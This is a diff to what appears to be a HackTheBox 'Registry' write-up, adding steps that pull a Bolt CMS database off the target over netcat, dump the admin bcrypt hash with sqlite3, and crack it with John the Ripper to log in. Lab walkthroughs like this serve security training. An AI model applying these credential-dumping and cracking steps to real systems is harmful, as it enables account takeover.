@@ -5,7 +5,7 @@ categories:
   - HackTheBox
 tags: [docker, linux, nginx, restic, cms, webshell, ssh, reverse port forward, jtr, CVE-2019-9185, python, anti-csrf]
 toc: true
-toc_sticky: true
+toc_sticky: false
 toc_label: "Table of Awesome Content"
 toc_icon: "cog"
 ---
@@ -337,9 +337,9 @@ server {
 
 That config file has details about a database called "bolt.db" and a URL location "/bolt/bolt". Open up your web browser and go to that location to find the Bolt app.
 
-![](\Sidequests\assets\registry\2020-03-08_21h19_20.png)
+[![](\Sidequests\assets\registry\2020-03-08_21h19_20.png)](\Sidequests\assets\registry\2020-03-08_21h19_20.png)
 
-## Accessing Bolt App
+# Accessing Bolt App
 
 It's usually good practice to try previously found credentials on new targets like this, but so far we don't have the right ones. Instead, continue the enumeration by looking into the other info found from the config file, "bolt.db". 
 
@@ -361,3 +361,58 @@ And on your local machine use netcat to connect to the listener, with it set up 
 `nc registry.htb 5555 > bolt.db`
 
 Once you enter that command, it will connect and receive the database, then you'll just need to kill the connection and analyze the file!
+
+## Analyzing bolt.db with sqlite3
+
+Open the newly downloaded database file with `sqlite3 bolt.db`, and it will tell you to use ".help" for usage directions.
+
+{% highlight console %}
+~/htb/registry ᐅ sqlite3 bolt.db
+SQLite version 3.31.1 2020-01-27 19:55:54
+Enter ".help" for usage hints.
+sqlite> 
+{% endhighlight %}
+
+To list out the tables, use the command `.tables`.
+
+{% highlight console %}
+sqlite> .tables
+bolt_authtoken    bolt_field_value  bolt_pages        bolt_users      
+bolt_blocks       bolt_homepage     bolt_relations  
+bolt_cron         bolt_log_change   bolt_showcases  
+bolt_entries      bolt_log_system   bolt_taxonomy 
+{% endhighlight %}
+
+Any table with "users" in the name is usually good for enumeration, so dump that table with the SQL query `select * from bolt_users`.
+
+{% highlight sql %}
+sqlite> select * from bolt_users;
+1|admin|$2y$10$e.ChUytg9SrL7AsboF2bX.wWKQ1LkS5Fi3/Z0yYD86.P5E9cpY7PK|bolt@registry.htb|2020-03-09 03:46:01|10.10.15.237|Admin|["files://leax.php"]|1||||0||["root","everyone"]
+sqlite> 
+{% endhighlight %}
+
+It looks like there is a user "admin" and a password hash in the record. Use whichever is your favorite password cracker for this, mine is John The Ripper.
+
+## Bolt user credential cracking with John The Ripper
+
+Start by copying the hash into a text file. Then use the command to call john on it with `john --wordlist=/usr/share/wordlists/rockyou.txt bolt.admin.hash`.
+
+{% highlight console %}
+~/htb/registry ᐅ sudo john --wordlist=/usr/share/wordlists/rockyou.txt bolt.admin.hash
+[sudo] password for kali: 
+Created directory: /root/.john
+Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 1024 for all loaded hashes
+Press 'q' or Ctrl-C to abort, almost any other key for status
+strawberry       (?)
+1g 0:00:00:08 DONE (2020-03-10 21:54) 0.1153g/s 37.71p/s 37.71c/s 37.71C/s strawberry..dennis
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+{% endhighlight %}
+
+Turns out the password is cracked right away as "strawberry". Just use "admin" and "strawberry" to login at the prompt on the app page.
+
+[![Bolt App Dashboard](\Sidequests\assets\registry\2020-03-10_22h01_30.png)](\Sidequests\assets\registry\2020-03-10_22h01_30.png)
+
+# Bolt App Hacking
